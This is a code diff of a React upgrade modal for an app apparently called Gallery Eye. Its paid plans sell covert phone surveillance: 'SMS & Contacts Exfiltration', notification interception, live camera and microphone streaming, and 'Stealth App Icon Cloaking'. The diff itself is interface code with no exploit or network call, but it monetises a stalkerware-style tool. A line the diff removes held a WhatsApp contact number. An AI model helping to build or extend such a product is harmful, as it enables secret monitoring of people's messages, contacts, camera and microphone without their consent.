@@ -1,7 +1,7 @@
 "use client";
 
-import { Zap, Crown, Check } from 'lucide-react';
-import { motion, AnimatePresence } from 'framer-motion';
+import React from 'react';
+import { Zap, Crown, Check, X, ArrowUpRight } from 'lucide-react';
 
 interface UpgradeModalProps {
     isOpen: boolean;
@@ -13,125 +13,139 @@ interface UpgradeModalProps {
 
 const planConfig = {
     standard: {
-        name: 'Standard',
+        name: 'Standard Tier',
         price: '$5',
         period: '/ year',
         accent: '#10b981',
-        icon: <Zap size={24} />,
+        icon: Zap,
         features: [
             'Unlimited Photos & Videos',
-            'SMS & Contacts Sync',
-            'Notification Reader',
-            'Torch & Vibration Control',
-            'ZIP & Bulk Download',
-            'Up to 5 Devices',
+            'SMS & Contacts Exfiltration',
+            'Notification Interceptor',
+            'Torch & Vibration Remote Pulse',
+            'ZIP & Bulk Archive Download',
+            'Up to 5 Paired Endpoints',
         ],
     },
     premium: {
-        name: 'Premium',
+        name: 'Premium VIP',
         price: '$10',
         period: '/ year',
         accent: '#f59e0b',
-        icon: <Crown size={24} />,
+        icon: Crown,
         features: [
             'Everything in Standard',
-            'Live Camera Streaming',
-            'Live Microphone & Recording',
-            'Hide App Icon',
-            'Up to 10 Devices',
-            'All Permissions Unlocked',
+            'Live HD Camera Streaming',
+            'Live Mic Streaming & Audio Vault',
+            'Stealth App Icon Cloaking',
+            'Up to 10 Paired Endpoints',
+            'All Sensor Permissions Unlocked',
         ],
     },
 };
 
 export default function UpgradeModal({ isOpen, onClose, feature, requiredPlan, onViewPlans }: UpgradeModalProps) {
     if (!isOpen) return null;
-    const plan = planConfig[requiredPlan];
+    const plan = planConfig[requiredPlan] || planConfig.standard;
     const isPremium = requiredPlan === 'premium';
-
-    const whatsAppLink = `https://wa.me/923460257488?text=${encodeURIComponent(`⚡ *Upgrade Request*\n\nI want the ${plan.name} plan (${plan.price}${plan.period}) for Gallery Eye.\n\nFeature needed: ${feature}\n\nPlease process my request! 🙏`)}`;
+    const Icon = plan.icon;
 
     return (
-        <AnimatePresence>
-            <div className="fixed inset-0 z-[700] flex items-center justify-center p-4" onClick={onClose}>
-                <motion.div
-                    initial={{ opacity: 0 }}
-                    animate={{ opacity: 1 }}
-                    exit={{ opacity: 0 }}
-                    className="absolute inset-0 bg-black/80 backdrop-blur-md"
-                />
-
-                <motion.div
-                    initial={{ opacity: 0, scale: 0.95, y: 20 }}
-                    animate={{ opacity: 1, scale: 1, y: 0 }}
-                    exit={{ opacity: 0, scale: 0.95, y: 20 }}
-                    transition={{ type: 'spring', damping: 28, stiffness: 350 }}
-                    className="relative w-full max-w-sm bg-gradient-to-b from-[#15161a] to-[#0f1013] border rounded-3xl overflow-hidden shadow-2xl"
-                    style={{ borderColor: `${plan.accent}25` }}
-                    onClick={e => e.stopPropagation()}
+        <div 
+            className="fixed inset-0 z-[700] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-in fade-in duration-100"
+            onClick={onClose}
+        >
+            <div 
+                className="relative w-full max-w-sm bg-[#0f1115] border border-white/15 rounded-3xl p-6 shadow-[0_25px_80px_rgba(0,0,0,0.98)] text-center animate-in zoom-in-95 duration-100"
+                onClick={e => e.stopPropagation()}
+            >
+                {/* Close Button */}
+                <button
+                    onClick={onClose}
+                    className="clay-button-sm absolute top-4 right-4 w-8 h-8 rounded-xl flex items-center justify-center text-white/50 hover:text-white transition-all cursor-pointer"
                 >
-                    {/* Glow */}
-                    <div className="absolute top-0 left-1/2 -translate-x-1/2 w-48 h-32 rounded-full blur-3xl pointer-events-none" style={{ background: `${plan.accent}15` }} />
+                    <X size={14} />
+                </button>
 
-                    {/* Header */}
-                    <div className="p-6 pb-4 text-center relative">
-                        <div
-                            className="w-14 h-14 rounded-2xl flex items-center justify-center mx-auto mb-4 border"
-                            style={{
-                                background: `${plan.accent}15`,
-                                borderColor: `${plan.accent}30`,
-                                color: plan.accent,
-                                boxShadow: `0 0 25px ${plan.accent}20`,
-                            }}
-                        >
-                            {plan.icon}
-                        </div>
-                        <p className="text-[10px] font-black tracking-[0.15em] uppercase mb-1" style={{ color: plan.accent }}>
-                            {plan.name} Plan Required
-                        </p>
-                        <h2 className="text-lg font-bold text-white tracking-tight">{feature}</h2>
-                        <p className="text-xs text-white/35 mt-1">Upgrade to unlock this feature</p>
+                {/* 3D Icon Pod */}
+                <div 
+                    className="w-16 h-16 rounded-3xl mx-auto mb-3 flex items-center justify-center border"
+                    style={{
+                        background: `${plan.accent}15`,
+                        borderColor: `${plan.accent}40`,
+                        color: plan.accent,
+                        boxShadow: `0 0 25px ${plan.accent}30`
+                    }}
+                >
+                    <Icon size={28} />
+                </div>
+
+                {/* Plan Tag */}
+                <div 
+                    className="inline-block text-[10px] font-mono font-black uppercase tracking-widest px-2.5 py-0.5 rounded-full border mb-2"
+                    style={{
+                        background: `${plan.accent}20`,
+                        borderColor: `${plan.accent}50`,
+                        color: plan.accent,
+                    }}
+                >
+                    {plan.name} Required
+                </div>
+
+                {/* Feature Name */}
+                <h2 className="text-base sm:text-lg font-black text-white tracking-tight mb-1">
+                    {feature}
+                </h2>
+                <p className="text-xs text-white/40 font-mono mb-4">
+                    Upgrade to unlock this surveillance module
+                </p>
+
+                {/* Features Checklist */}
+                <div className="bg-[#14161b] border border-white/10 rounded-2xl p-4 mb-5 text-left">
+                    <div className="text-[10px] font-mono font-black uppercase tracking-widest text-white/40 mb-2.5">
+                        {plan.name} includes:
                     </div>
-
-                    {/* Features */}
-                    <div className="px-5 pb-5">
-                        <div className="bg-white/[0.03] border border-white/[0.06] rounded-2xl p-4 mb-5">
-                            <p className="text-[10px] font-bold tracking-widest uppercase text-white/25 mb-3">{plan.name} includes</p>
-                            <div className="space-y-2.5">
-                                {plan.features.map((f, i) => (
-                                    <div key={i} className="flex items-center gap-2.5">
-                                        <Check size={13} className="flex-shrink-0" style={{ color: plan.accent }} />
-                                        <span className="text-xs text-white/60">{f}</span>
-                                    </div>
-                                ))}
+                    <div className="space-y-2">
+                        {plan.features.map((f, i) => (
+                            <div key={i} className="flex items-center gap-2">
+                                <Check size={13} className="shrink-0" style={{ color: plan.accent }} strokeWidth={3} />
+                                <span className="text-xs text-zinc-300 leading-tight">{f}</span>
                             </div>
-                            <div className="mt-4 pt-3 border-t border-white/[0.06] flex items-baseline gap-1">
-                                <span className="text-xl font-black text-white">{plan.price}</span>
-                                <span className="text-xs text-white/25">{plan.period}</span>
-                            </div>
-                        </div>
-
-                        {/* Buttons */}
-                        <button
-                            onClick={onViewPlans || onClose}
-                            className="w-full py-3.5 rounded-xl text-sm font-bold text-center transition-all flex items-center justify-center gap-2 mb-3"
-                            style={{
-                                background: plan.accent,
-                                color: isPremium ? '#000' : '#fff',
-                                boxShadow: `0 0 25px ${plan.accent}40`,
-                            }}
-                        >
-                            {isPremium ? <Crown size={15} /> : <Zap size={15} />} View Plans & Upgrade
-                        </button>
-                        <button
-                            onClick={onClose}
-                            className="w-full py-2.5 rounded-xl text-xs font-medium text-white/30 hover:text-white/50 transition-colors"
-                        >
-                            Maybe later
-                        </button>
+                        ))}
                     </div>
-                </motion.div>
+                    <div className="mt-3.5 pt-3 border-t border-white/10 flex items-baseline justify-between">
+                        <span className="text-[10px] font-mono uppercase text-white/40">Pricing</span>
+                        <div className="flex items-baseline gap-1">
+                            <span className="text-base font-black text-white font-mono">{plan.price}</span>
+                            <span className="text-[10px] text-white/40 font-mono">{plan.period}</span>
+                        </div>
+                    </div>
+                </div>
+
+                {/* Buttons */}
+                <div className="flex flex-col gap-2">
+                    <button
+                        type="button"
+                        onClick={onViewPlans || onClose}
+                        className="w-full py-3 rounded-2xl text-xs font-mono font-black uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 shadow-lg active:scale-95 cursor-pointer"
+                        style={{
+                            background: plan.accent,
+                            color: isPremium ? '#000' : '#000',
+                            boxShadow: `0 0 20px ${plan.accent}50`,
+                        }}
+                    >
+                        <span>View Plans & Upgrade</span>
+                        <ArrowUpRight size={14} />
+                    </button>
+                    <button
+                        type="button"
+                        onClick={onClose}
+                        className="py-2 text-[11px] font-mono text-white/40 hover:text-white transition-colors cursor-pointer"
+                    >
+                        Maybe later
+                    </button>
+                </div>
             </div>
-        </AnimatePresence>
+        </div>
     );
 }
